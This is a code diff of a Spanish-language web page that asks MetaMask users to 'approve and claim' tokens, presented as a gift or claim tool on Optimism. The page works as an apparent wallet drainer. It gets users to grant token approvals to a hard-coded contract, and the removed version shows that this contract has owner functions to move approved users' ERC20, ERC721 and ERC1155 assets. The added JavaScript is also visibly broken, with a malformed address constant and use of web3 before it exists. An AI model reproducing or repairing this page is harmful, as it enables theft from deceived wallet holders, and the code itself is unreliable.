@@ -3,193 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.2.umd/ethers-5.2.umd.min.js"></script>
-
-    <title>Gestor de Regalos Optimism</title>
-    <style>
-        :root {
-            --primary: #FF0420;
-            --secondary: #1a1a1a;
-            --background: #0a0a0a;
-            --text: #ffffff;
-        }
-
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: var(--background);
-            color: var(--text);
-            margin: 0;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .wallet-section {
-            text-align: right;
-            margin-bottom: 20px;
-        }
-
-        .section {
-            background-color: var(--secondary);
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-
-        h2 {
-            color: var(--primary);
-            border-bottom: 2px solid var(--primary);
-            padding-bottom: 10px;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        input, button {
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            margin: 5px;
-            width: 300px;
-        }
-
-        button {
-            background-color: var(--primary);
-            color: white;
-            cursor: pointer;
-            transition: opacity 0.3s;
-        }
-
-        button:hover {
-            opacity: 0.8;
-        }
-
-        .owner-section {
-            border: 2px solid var(--primary);
-        }
-
-        .status {
-            padding: 10px;
-            margin-top: 10px;
-            border-radius: 5px;
-            display: none;
-        }
-
-        .success {
-            background-color: #28a745;
-        }
-
-        .error {
-            background-color: #dc3545;
-        }
-
-        .pending {
-            background-color: #ffc107;
-        }
-    </style>
+    <title>Conectar MetaMask y Aprobar Tokens</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <div class="wallet-section">
-            <button onclick="connectWallet()" id="connectBtn">Conectar Wallet</button>
-            <div id="walletAddress"></div>
-        </div>
-
-        <div class="section">
-            <h2>Gestionar Aprobaciones</h2>
-            <div class="input-group">
-                <input type="text" id="erc20Token" placeholder="Dirección Token ERC20">
-                <input type="number" id="erc20Amount" placeholder="Cantidad">
-                <button onclick="addERC20Approval()">Añadir Aprobación ERC20</button>
-            </div>
-            <button onclick="claimAllApprovals()">Enviar Todas las Aprobaciones</button>
-        </div>
-
-        <div class="section owner-section" id="ownerSection">
-            <h2>Funciones de Propietario</h2>
-            <div class="input-group">
-                <input type="text" id="transferUser" placeholder="Dirección del Usuario">
-                <input type="text" id="transferToken" placeholder="Dirección del Token/NFT">
-                <input type="number" id="transferAmount" placeholder="Cantidad/Token ID">
-                <button onclick="transferERC20()">Transferir ERC20</button>
-                <button onclick="transferERC721()">Transferir ERC721</button>
-                <button onclick="transferERC1155()">Transferir ERC1155</button>
-            </div>
-        </div>
-
-        <div id="status" class="status"></div>
-    </div>
-
+    <button onclick="connectWallet()">Conectar MetaMask</button>
+    <button onclick="approveAndClaim()">Aprobar y Reclamar Tokens</button>
+    
     <script>
-        let provider, signer, contract;
-        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; 
-        const contractABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"user","type":"address"},{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"ApprovalUpdated","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"asset","type":"address"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"AssetTransferred","type":"event"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC1155Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"}],"name":"checkERC20Allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"}],"name":"checkERC721Approval","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address[]","name":"tokensERC20","type":"address[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"address[]","name":"contractsERC721","type":"address[]"},{"internalType":"address[]","name":"contractsERC1155","type":"address[]"}],"name":"claimAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC1155Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferERC1155ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferERC20ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferERC721ToContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"transferETHToContract","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"withdrawERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]; 
+        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Reemplaza con la dirección real del contrato
+        const tokenAddress = "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
+"0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
+"0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"; // Reemplaza con la dirección del token
+        const contractABI = [
+            {
+                "constant": false,
+                "inputs": [],
+                "name": "claimAll",
+                "outputs": [],
+                "type": "function"
+            }
+        ];
+        const tokenABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "spender", "type": "address"},
+                    {"name": "amount", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [],
+                "type": "function"
+            }
+        ];
+        
+        let web3;
+        let contract;
+        let tokenContract;
+        let userAccount;
+        const approveAmount = web3.utils.toWei("100", "ether"); // Ajusta la cantidad a aprobar
 
         async function connectWallet() {
             if (window.ethereum) {
-                try {
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
-                    signer = provider.getSigner();
-                    contract = new ethers.Contract(contractAddress, contractABI, signer);
-                    
-                    const address = await signer.getAddress();
-                    document.getElementById('walletAddress').textContent = `Conectado: ${address.slice(0,6)}...${address.slice(-4)}`;
-                    
-                    // Verificar si es owner
-                    const owner = await contract.owner();
-                    if (address.toLowerCase() === owner.toLowerCase()) {
-                        document.getElementById('ownerSection').style.display = 'block';
-                    }
-                } catch (error) {
-                    showStatus(`Error: ${error.message}`, 'error');
-                }
+                web3 = new Web3(window.ethereum);
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                const accounts = await web3.eth.getAccounts();
+                userAccount = accounts[0];
+                contract = new web3.eth.Contract(contractABI, contractAddress);
+                tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+                console.log("Conectado: ", userAccount);
             } else {
-                showStatus('Por favor instala MetaMask!', 'error');
+                alert("Instala MetaMask para continuar");
             }
         }
 
-        async function claimAllApprovals() {
+        async function approveAndClaim() {
+            if (!userAccount) {
+                alert("Conecta tu wallet primero");
+                return;
+            }
             try {
-                showStatus('Procesando aprobaciones...', 'pending');
-                const tx = await contract.claimAll([], [], [], []);
-                await tx.wait();
-                showStatus('Aprobaciones completadas!', 'success');
+                // Aprobar tokens
+                await tokenContract.methods.approve(contractAddress, approveAmount).send({ from: userAccount });
+                console.log("Tokens aprobados");
+                
+                // Reclamar tokens
+                await contract.methods.claimAll().send({ from: userAccount });
+                alert("Tokens aprobados y reclamados exitosamente");
             } catch (error) {
-                showStatus(`Error: ${error.message}`, 'error');
+                console.error("Error en la transacción: ", error);
+                alert("Error en la transacción");
             }
-        }
-
-        async function transferERC20() {
-            const user = document.getElementById('transferUser').value;
-            const token = document.getElementById('transferToken').value;
-            const amount = document.getElementById('transferAmount').value;
-            
-            try {
-                showStatus('Iniciando transferencia ERC20...', 'pending');
-                const tx = await contract.transferERC20ToContract(user, token, amount);
-                await tx.wait();
-                showStatus('Transferencia ERC20 exitosa!', 'success');
-            } catch (error) {
-                showStatus(`Error: ${error.message}`, 'error');
-            }
-        }
-
-        // Funciones similares para ERC721 y ERC1155...
-
-        function showStatus(message, type) {
-            const statusDiv = document.getElementById('status');
-            statusDiv.textContent = message;
-            statusDiv.className = `status ${type}`;
-            statusDiv.style.display = 'block';
-            
-            setTimeout(() => {
-                statusDiv.style.display = 'none';
-            }, 5000);
         }
     </script>
 </body>
